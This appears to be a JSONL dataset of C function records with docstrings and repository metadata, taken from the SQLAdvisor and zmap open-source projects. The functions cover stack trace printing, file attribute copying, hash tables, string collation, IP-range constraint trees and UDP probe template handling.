{"docstring": "/* BACKTRACE_DEMANGLE */\n", "func_signal": "void my_print_stacktrace(uchar* stack_bottom, ulong thread_stack)", "code": "{\n  void *addrs[128];\n  char **strings= NULL;\n  int n = backtrace(addrs, array_elements(addrs));\n  my_safe_printf_stderr(\"stack_bottom = %p thread_stack 0x%lx\\n\",\n                        stack_bottom, thread_stack);\n#if BACKTRACE_DEMANGLE\n  if ((strings= backtrace_symbols(addrs, n)))\n  {\n    my_demangle_symbols(strings, n);\n    free(strings);\n  }\n#endif\n#if HAVE_BACKTRACE_SYMBOLS_FD\n  if (!strings)\n  {\n    backtrace_symbols_fd(addrs, n, fileno(stderr));\n  }\n#endif\n}", "path": "SQLAdvisor/mysys/stacktrace.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/* get_options */\n", "func_signal": "static const char *get_ha_error_msg(int code)", "code": "{\n  /*\n    If you got compilation error here about compile_time_assert array, check\n    that every HA_ERR_xxx constant has a corresponding error message in\n    handler_error_messages[] list (check mysys/my_handler_errors.h and\n    include/my_base.h).\n  */\n  compile_time_assert(HA_ERR_FIRST + array_elements(handler_error_messages) ==\n                      HA_ERR_LAST + 1);\n  if (code >= HA_ERR_FIRST && code <= HA_ERR_LAST)\n    return handler_error_messages[code - HA_ERR_FIRST];\n\n  return NullS;\n}", "path": "SQLAdvisor/extra/perror.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/* defined(__alpha__) && defined(__GNUC__) */\n", "func_signal": "void my_print_stacktrace(uchar* stack_bottom, ulong thread_stack)", "code": "{\n  uchar** fp;\n  uint frame_count = 0, sigreturn_frame_count;\n#if defined(__alpha__) && defined(__GNUC__)\n  uint32* pc;\n#endif\n  LINT_INIT(fp);\n\n\n#ifdef __i386__\n  __asm __volatile__ (\"movl %%ebp,%0\"\n\t\t      :\"=r\"(fp)\n\t\t      :\"r\"(fp));\n#endif\n#ifdef __x86_64__\n  __asm __volatile__ (\"movq %%rbp,%0\"\n\t\t      :\"=r\"(fp)\n\t\t      :\"r\"(fp));\n#endif\n#if defined(__alpha__) && defined(__GNUC__) \n  __asm __volatile__ (\"mov $30,%0\"\n\t\t      :\"=r\"(fp)\n\t\t      :\"r\"(fp));\n#endif\n  if (!fp)\n  {\n    my_safe_printf_stderr(\"%s\",\n      \"frame pointer is NULL, did you compile with\\n\"\n      \"-fomit-frame-pointer? Aborting backtrace!\\n\");\n    return;\n  }\n\n  if (!stack_bottom || (uchar*) stack_bottom > (uchar*) &fp)\n  {\n    ulong tmp= MY_MIN(0x10000, thread_stack);\n    /* Assume that the stack starts at the previous even 65K */\n    stack_bottom= (uchar*) (((ulong) &fp + tmp) & ~(ulong) 0xFFFF);\n    my_safe_printf_stderr(\"Cannot determine thread, fp=%p, \"\n                          \"backtrace may not be correct.\\n\", fp);\n  }\n  if (fp > (uchar**) stack_bottom ||\n      fp < (uchar**) stack_bottom - thread_stack)\n  {\n    my_safe_printf_stderr(\"Bogus stack limit or frame pointer, \"\n                          \"fp=%p, stack_bottom=%p, thread_stack=%ld, \"\n                          \"aborting backtrace.\\n\",\n                          fp, stack_bottom, thread_stack);\n    return;\n  }\n\n  my_safe_printf_stderr(\"%s\",\n    \"Stack range sanity check OK, backtrace follows:\\n\");\n#if defined(__alpha__) && defined(__GNUC__)\n  my_safe_printf_stderr(\"%s\",\n    \"Warning: Alpha stacks are difficult -\"\n    \"will be taking some wild guesses, stack trace may be incorrect or \"\n    \"terminate abruptly\\n\");\n\n  /* On Alpha, we need to get pc */\n  __asm __volatile__ (\"bsr %0, do_next; do_next: \"\n\t\t      :\"=r\"(pc)\n\t\t      :\"r\"(pc));\n#endif  /* __alpha__ */\n\n  /* We are 1 frame above signal frame with NPTL and 2 frames above with LT */\n  sigreturn_frame_count = thd_lib_detected == THD_LIB_LT ? 2 : 1;\n\n  while (fp < (uchar**) stack_bottom)\n  {\n#if defined(__i386__) || defined(__x86_64__)\n    uchar** new_fp = (uchar**)*fp;\n    my_safe_printf_stderr(\"%p\\n\",\n                          frame_count == sigreturn_frame_count ?\n                          *(fp + SIGRETURN_FRAME_OFFSET) : *(fp + 1));\n#endif /* defined(__386__)  || defined(__x86_64__) */\n\n#if defined(__alpha__) && defined(__GNUC__)\n    uchar** new_fp = find_prev_fp(pc, fp);\n    if (frame_count == sigreturn_frame_count - 1)\n    {\n      new_fp += 90;\n    }\n\n    if (fp && pc)\n    {\n      pc = find_prev_pc(pc, fp);\n      if (pc)\n\tmy_safe_printf_stderr(\"%p\\n\", pc);\n      else\n      {\n        my_safe_printf_stderr(\"%s\",\n          \"Not smart enough to deal with the rest of this stack\\n\");\n\tgoto end;\n      }\n    }\n    else\n    {\n      my_safe_printf_stderr(\"%s\",\n        \"Not smart enough to deal with the rest of this stack\\n\");\n      goto end;\n    }\n#endif /* defined(__alpha__) && defined(__GNUC__) */\n    if (new_fp <= fp )\n    {\n      my_safe_printf_stderr(\"New value of fp=%p failed sanity check, \"\n                            \"terminating stack trace!\\n\", new_fp);\n      goto end;\n    }\n    fp = new_fp;\n    ++frame_count;\n  }\n  my_safe_printf_stderr(\"%s\",\n                        \"Stack trace seems successful - bottom reached\\n\");\n\nend:\n  my_safe_printf_stderr(\"%s\",\n    \"Please read \"\n    \"http://dev.mysql.com/doc/refman/5.1/en/resolve-stack-dump.html\\n\"\n    \"and follow instructions on how to resolve the stack trace.\\n\"\n    \"Resolved stack trace is much more helpful in diagnosing the\\n\"\n    \"problem, so please do resolve it\\n\");\n}", "path": "SQLAdvisor/mysys/stacktrace.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/* Return -1 if can't get stat, 1 if wrong type of file */\n", "func_signal": "int my_copystat(const char *from, const char *to, int MyFlags)", "code": "{\n  MY_STAT statbuf;\n\n  if (my_stat(from, &statbuf, MyFlags) == NULL)\n    return -1;\t\t\t\t/* Can't get stat on input file */\n\n  if ((statbuf.st_mode & S_IFMT) != S_IFREG)\n    return 1;\n\n  /* Copy modes */\n  if (chmod(to, statbuf.st_mode & 07777))\n  {\n    my_errno= errno;\n    if (MyFlags & (MY_FAE+MY_WME))\n    {\n      char errbuf[MYSYS_STRERROR_SIZE];\n      my_error(EE_CHANGE_PERMISSIONS, MYF(ME_BELL+ME_WAITTANG), from,\n               errno, my_strerror(errbuf, sizeof(errbuf), errno));\n    }\n    return -1;\n  }\n\n#if !defined(__WIN__)\n  if (statbuf.st_nlink > 1 && MyFlags & MY_LINK_WARNING)\n  {\n    if (MyFlags & MY_LINK_WARNING)\n      my_error(EE_LINK_WARNING,MYF(ME_BELL+ME_WAITTANG),from,statbuf.st_nlink);\n  }\n  /* Copy ownership */\n  if (chown(to, statbuf.st_uid, statbuf.st_gid))\n  {\n    my_errno= errno;\n    if (MyFlags & (MY_FAE+MY_WME))\n    {\n      char errbuf[MYSYS_STRERROR_SIZE];\n      my_error(EE_CHANGE_OWNERSHIP, MYF(ME_BELL+ME_WAITTANG), from,\n               errno, my_strerror(errbuf, sizeof(errbuf), errno));\n    }\n    return -1;\n  }\n#endif /* !__WIN__ */\n\n  if (MyFlags & MY_COPYTIME)\n  {\n    struct utimbuf timep;\n    timep.actime  = statbuf.st_atime;\n    timep.modtime = statbuf.st_mtime;\n    (void) utime((char*) to, &timep);/* Update last accessed and modified times */\n  }\n\n  return 0;\n}", "path": "SQLAdvisor/mysys/my_redel.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/* Get key and length for a SAFE_HASH_ENTRY */\n", "func_signal": "static uchar *safe_hash_entry_get(SAFE_HASH_ENTRY *entry, size_t *length,\n                                  my_bool not_used __attribute__((unused)))", "code": "{\n  *length=entry->length;\n  return (uchar*) entry->key;\n}", "path": "SQLAdvisor/mysys/mf_keycaches.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/* Set new working directory */\n", "func_signal": "int my_setwd(const char *dir, myf MyFlags)", "code": "{\n  int res;\n  size_t length;\n  char *start, *pos;\n  DBUG_ENTER(\"my_setwd\");\n  DBUG_PRINT(\"my\",(\"dir: '%s'  MyFlags %d\", dir, MyFlags));\n\n  start=(char *) dir;\n  if (! dir[0] || (dir[0] == FN_LIBCHAR && dir[1] == 0))\n    dir=FN_ROOTDIR;\n  if ((res=chdir((char*) dir)) != 0)\n  {\n    my_errno=errno;\n    if (MyFlags & MY_WME)\n    {\n      char errbuf[MYSYS_STRERROR_SIZE];\n      my_error(EE_SETWD, MYF(ME_BELL+ME_WAITTANG), start,\n               errno, my_strerror(errbuf, sizeof(errbuf), errno));\n    }\n  }\n  else\n  {\n    if (test_if_hard_path(start))\n    {\t\t\t\t\t\t/* Hard pathname */\n      pos= strmake(&curr_dir[0],start,(size_t) FN_REFLEN-1);\n      if (pos[-1] != FN_LIBCHAR)\n      {\n\tlength=(uint) (pos-(char*) curr_dir);\n\tcurr_dir[length]=FN_LIBCHAR;\t\t/* must end with '/' */\n\tcurr_dir[length+1]='\\0';\n      }\n    }\n    else\n      curr_dir[0]='\\0';\t\t\t\t/* Don't save name */\n  }\n  DBUG_RETURN(res);\n}", "path": "SQLAdvisor/mysys/my_getwd.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/*\n  Associate a key with some data\n\n  SYONOPSIS\n    safe_hash_set()\n    hash\t\t\tHash handle\n    key\t\t\t\tkey (path to table etc..)\n    length\t\t\tLength of key\n    data\t\t\tdata to to associate with the data\n\n  NOTES\n    This can be used both to insert a new entry and change an existing\n    entry.\n    If one associates a key with the default key cache, the key is deleted\n\n  RETURN\n    0  ok\n    1  error (Can only be EOM). In this case my_message() is called.\n*/\n", "func_signal": "static my_bool safe_hash_set(SAFE_HASH *hash, const uchar *key, uint length,\n\t\t\t     uchar *data)", "code": "{\n  SAFE_HASH_ENTRY *entry;\n  my_bool error= 0;\n  DBUG_ENTER(\"safe_hash_set\");\n  DBUG_PRINT(\"enter\",(\"key: %.*s  data: 0x%lx\", length, key, (long) data));\n\n  rw_wrlock(&hash->mutex);\n  entry= (SAFE_HASH_ENTRY*) my_hash_search(&hash->hash, key, length);\n\n  if (data == hash->default_value)\n  {\n    /*\n      The key is to be associated with the default entry. In this case\n      we can just delete the entry (if it existed) from the hash as a\n      search will return the default entry\n    */\n    if (!entry)\t\t\t\t\t/* nothing to do */\n      goto end;\n    /* unlink entry from list */\n    if ((*entry->prev= entry->next))\n      entry->next->prev= entry->prev;\n    my_hash_delete(&hash->hash, (uchar*) entry);\n    goto end;\n  }\n  if (entry)\n  {\n    /* Entry existed;  Just change the pointer to point at the new data */\n    entry->data= data;\n  }\n  else\n  {\n    if (!(entry= (SAFE_HASH_ENTRY *) my_malloc(sizeof(*entry) + length,\n\t\t\t\t\t       MYF(MY_WME))))\n    {\n      error= 1;\n      goto end;\n    }\n    entry->key= (uchar*) (entry +1);\n    memcpy((char*) entry->key, (char*) key, length);\n    entry->length= length;\n    entry->data= data;\n    /* Link entry to list */\n    if ((entry->next= hash->root))\n      entry->next->prev= &entry->next;\n    entry->prev= &hash->root;\n    hash->root= entry;\n    if (my_hash_insert(&hash->hash, (uchar*) entry))\n    {\n      /* This can only happen if hash got out of memory */\n      my_free(entry);\n      error= 1;\n      goto end;\n    }\n  }\n\nend:\n  rw_unlock(&hash->mutex);\n  DBUG_RETURN(error);\n}", "path": "SQLAdvisor/mysys/mf_keycaches.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/*\n  Compare two strings. Result is sign(first_argument - second_argument)\n\n  SYNOPSIS\n    my_strnncollsp_8bit_bin()\n    cs\t\t\tChararacter set\n    s\t\t\tString to compare\n    slen\t\tLength of 's'\n    t\t\t\tString to compare\n    tlen\t\tLength of 't'\n    diff_if_only_endspace_difference\n\t\t        Set to 1 if the strings should be regarded as different\n                        if they only difference in end space\n\n  NOTE\n   This function is used for character strings with binary collations.\n   The shorter string is extended with end space to be as long as the longer\n   one.\n\n  RETURN\n  < 0\ts < t\n  0\ts == t\n  > 0\ts > t\n*/\n", "func_signal": "static int my_strnncollsp_8bit_bin(const CHARSET_INFO *cs\n                                   __attribute__((unused)),\n                                   const uchar *a, size_t a_length, \n                                   const uchar *b, size_t b_length,\n                                   my_bool diff_if_only_endspace_difference)", "code": "{\n  const uchar *end;\n  size_t length;\n  int res;\n\n#ifndef VARCHAR_WITH_DIFF_ENDSPACE_ARE_DIFFERENT_FOR_UNIQUE\n  diff_if_only_endspace_difference= 0;\n#endif\n\n  end= a + (length= MY_MIN(a_length, b_length));\n  while (a < end)\n  {\n    if (*a++ != *b++)\n      return ((int) a[-1] - (int) b[-1]);\n  }\n  res= 0;\n  if (a_length != b_length)\n  {\n    int swap= 1;\n    /*\n      Check the next not space character of the longer key. If it's < ' ',\n      then it's smaller than the other key.\n    */\n    if (diff_if_only_endspace_difference)\n      res= 1;                                   /* Assume 'a' is bigger */\n    if (a_length < b_length)\n    {\n      /* put shorter key in s */\n      a_length= b_length;\n      a= b;\n      swap= -1;\t\t\t\t\t/* swap sign of result */\n      res= -res;\n    }\n    for (end= a + a_length-length; a < end ; a++)\n    {\n      if (*a != ' ')\n\treturn (*a < ' ') ? -swap : swap;\n    }\n  }\n  return res;\n}", "path": "SQLAdvisor/strings/ctype-bin.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/*\n  Get symbol path - semicolon-separated list of directories to search for debug\n  symbols. We expect PDB in the same directory as corresponding exe or dll,\n  so the path is build from directories of the loaded modules. If environment\n  variable _NT_SYMBOL_PATH is set, it's value appended to the symbol search path\n*/\n", "func_signal": "static void get_symbol_path(char *path, size_t size)", "code": "{ \n  HANDLE hSnap; \n  char *envvar;\n  char *p;\n#ifndef DBUG_OFF\n  static char pdb_debug_dir[MAX_PATH + 7];\n#endif\n\n  path[0]= '\\0';\n\n#ifndef DBUG_OFF\n  /* \n    Add \"debug\" subdirectory of the application directory, sometimes PDB will \n    placed here by installation.\n  */\n  GetModuleFileName(NULL, pdb_debug_dir, MAX_PATH);\n  p= strrchr(pdb_debug_dir, '\\\\');\n  if(p)\n  { \n    *p= 0;\n    strcat_s(pdb_debug_dir, sizeof(pdb_debug_dir), \"\\\\debug;\");\n    add_to_symbol_path(path, size, pdb_debug_dir, sizeof(pdb_debug_dir));\n  }\n#endif\n\n  /*\n    Enumerate all modules, and add their directories to the path.\n    Avoid duplicate entries.\n  */\n  hSnap= CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());\n  if (hSnap != INVALID_HANDLE_VALUE)\n  {\n    BOOL ret;\n    MODULEENTRY32 mod;\n    mod.dwSize= sizeof(MODULEENTRY32);\n    for (ret= Module32First(hSnap, &mod); ret; ret= Module32Next(hSnap, &mod))\n    {\n      char *module_dir= mod.szExePath;\n      p= strrchr(module_dir,'\\\\');\n      if (!p)\n      {\n        /*\n          Path separator was not found. Not known to happen, if ever happens,\n          will indicate current directory.\n        */\n        module_dir[0]= '.';\n        module_dir[1]= '\\0';\n      }\n      else\n      {\n        *p= '\\0';\n      }\n      add_to_symbol_path(path, size, module_dir,sizeof(mod.szExePath));\n    }\n    CloseHandle(hSnap);\n  }\n\n  \n  /* Add _NT_SYMBOL_PATH, if present. */\n  envvar= getenv(\"_NT_SYMBOL_PATH\");\n  if(envvar)\n  {\n    strcat_s(path, size, envvar);\n  }\n}", "path": "SQLAdvisor/mysys/stacktrace.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "// Set the value for a given network prefix, overwriting any existing\n// values on that prefix or subsets of it.\n// (Note: prefix must be in host byte order.)\n", "func_signal": "void constraint_set(constraint_t *con, uint32_t prefix, int len, value_t value)", "code": "{\n\tassert(con);\n\t_set_recurse(con->root, prefix, len, value);\n\tcon->painted = 0;\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Free all buffers held by the payload template, including its own\n", "func_signal": "void udp_template_free(udp_payload_template_t *t)", "code": "{\n\tfor (unsigned int x = 0; x < t->fcount; x++) {\n\t\tif (t->fields[x]->data) {\n\t\t\tfree(t->fields[x]->data);\n\t\t\tt->fields[x]->data = NULL;\n\t\t}\n\t\tfree(t->fields[x]);\n\t\tt->fields[x] = NULL;\n\t}\n\tfree(t->fields);\n\tt->fields = NULL;\n\tt->fcount = 0;\n\tfree(t);\n}", "path": "zmap/src/probe_modules/module_udp.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Initialize the tree.\n// All addresses will initially have the given value.\n", "func_signal": "constraint_t *constraint_init(value_t value)", "code": "{\n\tconstraint_t *con = xmalloc(sizeof(constraint_t));\n\tcon->root = _create_leaf(value);\n\tcon->radix = xcalloc(sizeof(uint32_t), 1 << RADIX_LENGTH);\n\tcon->painted = 0;\n\treturn con;\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// blocklist a CIDR network allocation\n// e.g. blocklist_add(\"128.255.134.0\", 24)\n", "func_signal": "void blocklist_prefix(char *ip, int prefix_len)", "code": "{\n\tstruct in_addr addr;\n\taddr.s_addr = inet_addr(ip);\n\t_add_constraint(addr, prefix_len, ADDR_DISALLOWED);\n}", "path": "zmap/lib/blocklist.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// allowlist a CIDR network allocation\n", "func_signal": "void allowlist_prefix(char *ip, int prefix_len)", "code": "{\n\tstruct in_addr addr;\n\taddr.s_addr = inet_addr(ip);\n\t_add_constraint(addr, prefix_len, ADDR_ALLOWED);\n}", "path": "zmap/lib/blocklist.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Convert a string field name to a field type, parsing any specified length\n// value\n", "func_signal": "int udp_template_field_lookup(char *vname, udp_payload_field_t *c)", "code": "{\n\tchar *param;\n\tunsigned int f;\n\tunsigned int olen = 0;\n\tunsigned int fcount = sizeof(udp_payload_template_fields) /\n\t\t\t      sizeof(udp_payload_template_fields[0]);\n\n\tparam = strstr((const char *)vname, \"=\");\n\tif (param) {\n\t\t*param = '\\0';\n\t\tparam++;\n\t}\n\n\t// Most field types treat their parameter as a generator output length\n\t// unless it is ignored (ADDR, PORT, etc).\n\tif (param) {\n\t\tolen = atoi((const char *)param);\n\t}\n\n\t// Find a field that matches the\n\tfor (f = 0; f < fcount; f++) {\n\n\t\tif (strcmp((char *)vname,\n\t\t\t   udp_payload_template_fields[f].name) == 0) {\n\t\t\tc->ftype = udp_payload_template_fields[f].ftype;\n\t\t\tc->length = olen;\n\t\t\tc->data = NULL;\n\t\t\treturn 1;\n\t\t}\n\t}\n\n\t// No match, skip and treat it as a data field\n\treturn 0;\n}", "path": "zmap/src/probe_modules/module_udp.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Recursive function to set value for a given network prefix within\n// the tree.  (Note: prefix must be in host byte order.)\n", "func_signal": "static void _set_recurse(node_t *node, uint32_t prefix, int len, value_t value)", "code": "{\n\tassert(node);\n\tassert(0 <= len && len <= 256);\n\n\tif (len == 0) {\n\t\t// We're at the end of the prefix; make this a leaf and set the\n\t\t// value.\n\t\tif (!IS_LEAF(node)) {\n\t\t\t_convert_to_leaf(node);\n\t\t}\n\t\tnode->value = value;\n\t\treturn;\n\t}\n\n\tif (IS_LEAF(node)) {\n\t\t// We're not at the end of the prefix, but we hit a leaf.\n\t\tif (node->value == value) {\n\t\t\t// A larger prefix has the same value, so we're done.\n\t\t\treturn;\n\t\t}\n\t\t// The larger prefix has a different value, so we need to\n\t\t// convert it into an internal node and continue processing on\n\t\t// one of the leaves.\n\t\tnode->l = _create_leaf(node->value);\n\t\tnode->r = _create_leaf(node->value);\n\t}\n\n\t// We're not at the end of the prefix, and we're at an internal\n\t// node.  Recurse on the left or right subtree.\n\tif (prefix & 0x80000000) {\n\t\t_set_recurse(node->r, prefix << 1, len - 1, value);\n\t} else {\n\t\t_set_recurse(node->l, prefix << 1, len - 1, value);\n\t}\n\n\t// At this point, we're an internal node, and the value is set\n\t// by one of our children or its descendent.  If both children are\n\t// leaves with the same value, we can discard them and become a left.\n\tif (IS_LEAF(node->r) && IS_LEAF(node->l) &&\n\t    node->r->value == node->l->value) {\n\t\tnode->value = node->l->value;\n\t\t_convert_to_leaf(node);\n\t}\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Deinitialize and free the tree.\n", "func_signal": "void constraint_free(constraint_t *con)", "code": "{\n\tassert(con);\n\tlog_debug(\"constraint\", \"Cleaning up\");\n\t_destroy_subtree(con->root);\n\tfree(con->radix);\n\tfree(con);\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Implement count_ips by recursing on halves of the tree.  Size represents\n// the number of addresses in a prefix at the current level of the tree.\n// If paint is specified, each node will have its count set to the number of\n// leaves under it set to value.\n// If exclude_radix is specified, the number of addresses will exlcude prefixes\n// that are a /RADIX_LENGTH or larger\n", "func_signal": "static uint64_t _count_ips_recurse(node_t *node, value_t value, uint64_t size,\n\t\t\t\t   int paint, int exclude_radix)", "code": "{\n\tassert(node);\n\tuint64_t n;\n\tif (IS_LEAF(node)) {\n\t\tif (node->value == value) {\n\t\t\tn = size;\n\t\t\t// Exclude prefixes already included in the radix\n\t\t\tif (exclude_radix &&\n\t\t\t    size >= (1 << (32 - RADIX_LENGTH))) {\n\t\t\t\tn = 0;\n\t\t\t}\n\t\t} else {\n\t\t\tn = 0;\n\t\t}\n\t} else {\n\t\tn = _count_ips_recurse(node->l, value, size >> 1, paint,\n\t\t\t\t       exclude_radix) +\n\t\t    _count_ips_recurse(node->r, value, size >> 1, paint,\n\t\t\t\t       exclude_radix);\n\t}\n\tif (paint) {\n\t\tnode->count = n;\n\t}\n\treturn n;\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Allocate a new leaf with the given value\n", "func_signal": "static node_t *_create_leaf(value_t value)", "code": "{\n\tnode_t *node = xmalloc(sizeof(node_t));\n\tnode->l = NULL;\n\tnode->r = NULL;\n\tnode->value = value;\n\treturn node;\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Return the value pertaining to an address.\n// (Note: address must be in host byte order.)\n", "func_signal": "value_t constraint_lookup_ip(constraint_t *con, uint32_t address)", "code": "{\n\tassert(con);\n\treturn _lookup_ip(con->root, address);\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Add a new field to the template\n", "func_signal": "void udp_template_add_field(udp_payload_template_t *t,\n\t\t\t    udp_payload_field_type_t ftype, unsigned int length,\n\t\t\t    char *data)", "code": "{\n\tudp_payload_field_t *c;\n\n\tt->fcount++;\n\tt->fields =\n\t    xrealloc(t->fields, sizeof(udp_payload_field_t) * t->fcount);\n\tif (!t->fields) {\n\t\texit(1);\n\t}\n\n\tt->fields[t->fcount - 1] = xmalloc(sizeof(udp_payload_field_t));\n\tc = t->fields[t->fcount - 1];\n\n\tif (!c) {\n\t\texit(1);\n\t}\n\n\tc->ftype = ftype;\n\tc->length = length;\n\tc->data = data;\n}", "path": "zmap/src/probe_modules/module_udp.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// network order\n", "func_signal": "uint32_t blocklist_ip_to_index(uint32_t ip)", "code": "{\n\tassert(constraint);\n\tuint32_t ip_hostorder = ntohl(ip);\n\treturn constraint_lookup_ip(constraint, ip_hostorder);\n}", "path": "zmap/lib/blocklist.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// For each node, precompute the count of leaves beneath it set to value.\n// Note that the tree can be painted for only one value at a time.\n", "func_signal": "void constraint_paint_value(constraint_t *con, value_t value)", "code": "{\n\tassert(con);\n\tlog_debug(\"constraint\", \"Painting value %lu\", value);\n\n\t// Paint everything except what we will put in radix\n\t_count_ips_recurse(con->root, value, (uint64_t)1 << 32, 1, 1);\n\n\t// Fill in the radix array with a list of addresses\n\tuint32_t i;\n\tcon->radix_len = 0;\n\tfor (i = 0; i < (1 << RADIX_LENGTH); i++) {\n\t\tuint32_t prefix = i << (32 - RADIX_LENGTH);\n\t\tnode_t *node = _lookup_node(con->root, prefix, RADIX_LENGTH);\n\t\tif (IS_LEAF(node) && node->value == value) {\n\t\t\t// Add this prefix to the radix\n\t\t\tcon->radix[con->radix_len++] = prefix;\n\t\t}\n\t}\n\tlog_debug(\"constraint\", \"%lu IPs in radix array, %lu IPs in tree\",\n\t\t  con->radix_len * (1 << (32 - RADIX_LENGTH)),\n\t\t  con->root->count);\n\tcon->painted = 1;\n\tcon->paint_value = value;\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Return a node that determines the values for the addresses with\n// the given prefix.  This is either the internal node that\n// corresponds to the end of the prefix or a leaf node that\n// encompasses the prefix. (Note: prefix must be in host byte order.)\n", "func_signal": "static node_t *_lookup_node(node_t *root, uint32_t prefix, int len)", "code": "{\n\tassert(root);\n\tassert(0 <= len && len <= 32);\n\n\tnode_t *node = root;\n\tuint32_t mask = 0x80000000;\n\tint i;\n\n\tfor (i = 0; i < len; i++) {\n\t\tif (IS_LEAF(node)) {\n\t\t\treturn node;\n\t\t}\n\t\tif (prefix & mask) {\n\t\t\tnode = node->r;\n\t\t} else {\n\t\t\tnode = node->l;\n\t\t}\n\t\tmask >>= 1;\n\t}\n\treturn node;\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Return the nth painted IP address.\n", "func_signal": "static int _lookup_index(node_t *root, uint64_t n)", "code": "{\n\tassert(root);\n\tnode_t *node = root;\n\tuint32_t ip = 0;\n\tuint32_t mask = 0x80000000;\n\tfor (;;) {\n\t\tif (IS_LEAF(node)) {\n\t\t\treturn ip | n;\n\t\t}\n\t\tif (n < node->l->count) {\n\t\t\tnode = node->l;\n\t\t} else {\n\t\t\tn -= node->l->count;\n\t\t\tnode = node->r;\n\t\t\tip |= mask;\n\t\t}\n\t\tmask >>= 1;\n\t}\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Convert from an internal node to a leaf.\n", "func_signal": "static void _convert_to_leaf(node_t *node)", "code": "{\n\tassert(node);\n\tassert(!IS_LEAF(node));\n\t_destroy_subtree(node->l);\n\t_destroy_subtree(node->r);\n\tnode->l = NULL;\n\tnode->r = NULL;\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Free the subtree rooted at node.\n", "func_signal": "static void _destroy_subtree(node_t *node)", "code": "{\n\tif (node == NULL)\n\t\treturn;\n\t_destroy_subtree(node->l);\n\t_destroy_subtree(node->r);\n\tfree(node);\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
